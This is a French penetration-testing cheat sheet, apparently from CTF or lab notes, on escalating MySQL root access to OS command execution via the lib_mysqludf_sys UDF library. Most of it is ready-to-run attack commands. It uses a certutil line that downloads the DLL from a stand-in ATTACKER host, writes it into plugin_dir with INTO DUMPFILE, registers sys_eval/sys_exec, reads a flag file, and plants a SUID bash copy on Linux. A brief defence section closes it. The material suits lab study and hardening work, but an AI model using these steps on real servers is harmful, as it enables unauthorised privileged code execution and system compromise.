# Cheatsheet — Privesc via UDF MySQL (`lib_mysqludf_sys`)

Transformer un accès **`root` MySQL** en **exécution de commandes OS** avec les droits du **service MySQL** (souvent `SYSTEM`/admin sous Windows, `root` sous Linux).

> ⚠️ Labs / périmètres autorisés uniquement.

---

## 1. Quand c'est exploitable (les 3 conditions)

1. Compte MySQL avec **privilège `FILE`** (souvent `root`).
2. **`secure_file_priv`** vide (ou pointant vers un dossier où on peut écrire).
3. **`plugin_dir`** inscriptible par le service (ou on y écrit via `FILE`).

```sql
SELECT user();                              -- qui suis-je (root@localhost ?)
SHOW GRANTS;                                -- FILE présent ?
SHOW VARIABLES LIKE 'plugin_dir';           -- cible de la DLL/.so
SHOW VARIABLES LIKE 'secure_file_priv';     -- '' = écriture libre
SELECT @@version_compile_os, @@version_compile_machine;  -- choix 32/64 bits
```
Windows — vérifier les droits sur le plugin_dir :
```cmd
icacls.exe C:\MYSQL\lib\plugin
```

---

## 2. La charge (fournie par Metasploit)

```bash
ls /usr/share/metasploit-framework/data/exploits/mysql/
# lib_mysqludf_sys_32.dll  lib_mysqludf_sys_64.dll   (Windows)
# lib_mysqludf_sys_32.so   lib_mysqludf_sys_64.so    (Linux)
```

Servir le fichier (vrai serveur HTTP — PAS `nc`) :
```bash
python3 -m http.server 8000
```

---

## 3. Windows — déposer la DLL puis exécuter

```cmd
REM télécharger la DLL sur la cible :
certutil.exe -urlcache -split -f http://ATTACKER:8000/lib_mysqludf_sys_64.dll C:\Temp\lib_mysqludf_sys_64.dll
```
```sql
-- écrire la DLL dans le plugin_dir via FILE :
SELECT LOAD_FILE('C:/Temp/lib_mysqludf_sys_64.dll')
INTO DUMPFILE 'C:/MYSQL/lib/plugin/lib_mysqludf_sys_64.dll';

-- déclarer la fonction :
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
-- (variante sans retour : sys_exec RETURNS INTEGER)

-- exécuter :
SELECT sys_eval('whoami');
SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
```
> ⚠️ La sortie revient souvent **en hexadécimal** → décoder (CyberChef « From Hex », ou `UNHEX()`).

---

## 4. Linux — variante `.so`

```sql
SHOW VARIABLES LIKE 'plugin_dir';           -- ex. /usr/lib/mysql/plugin/
SELECT LOAD_FILE('/tmp/lib_mysqludf_sys_64.so')
INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
-- puis : /tmp/rootbash -p
```
> Alternative « from hex » si pas d'écriture directe : insérer les octets de la lib en base, puis `SELECT data FROM t INTO DUMPFILE ...`.

---

## 5. Pourquoi ça marche (à l'oral)

Une UDF est une **bibliothèque native chargée dans le process MySQL**. Le privilège `FILE` permet d'écrire un fichier arbitraire (la lib) **dans le `plugin_dir`** via `INTO DUMPFILE`. `CREATE FUNCTION ... SONAME` mappe une fonction SQL sur un symbole de cette lib ; chaque appel s'exécute donc **avec les droits du compte de service MySQL**. Service en `SYSTEM`/`root` → RCE privilégié.

## 6. Côté défense

- Service MySQL en **compte dédié à moindre privilège** (jamais SYSTEM/root).
- **Retirer `FILE`** aux comptes applicatifs ; `secure_file_priv` sur un dossier contrôlé (pas le plugin_dir).
- `plugin_dir` **non inscriptible** par le service.
- Surveiller `CREATE FUNCTION` et les écritures dans `plugin_dir`.

## Fiches liées
- [file-transfer](file-transfer.md) · [windows-privesc](windows-privesc.md) · [linux-privesc](linux-privesc.md) · Machine : [Touch](../machines/Touch.md)
